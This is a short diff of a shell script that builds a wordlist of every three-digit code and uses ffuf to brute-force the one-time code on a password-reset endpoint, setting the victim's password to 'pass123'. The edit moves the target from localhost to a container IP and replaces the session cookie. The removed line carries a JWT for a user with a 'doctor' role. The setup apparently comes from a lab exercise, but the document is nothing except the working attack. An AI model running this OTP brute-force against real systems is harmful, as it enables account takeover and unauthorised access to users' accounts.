@@ -1,3 +1,3 @@
 for i in $(seq -w 000 999); do echo $i; done > otp-wordlist.txt
 
-ffuf -c -u "http://localhost:5000/reset/confirm.php" -X POST -d "otp_input=FUZZ&new_password=pass123" -w otp-wordlist.txt -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxhLm1pbGxlciIsInJvbGUiOiJkb2N0b3IiLCJpYXQiOjE3NjI3MjE0ODgsImV4cCI6MTc2MjczNTg4OH0.EwkWeccCHww8_M9BXQzE7d2oEkkEmVClFI9hpgULyqY; PHPSESSID=81bfaebbea4a7b2825a3a76231bc5726" -fs 2371
+ffuf -c -u "http://172.18.0.1:5000/reset/confirm.php" -X POST -d "otp_input=FUZZ&new_password=pass123" -w otp-wordlist.txt -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=d91f5def3dee707a37248bb457aa04de" -fs 1743
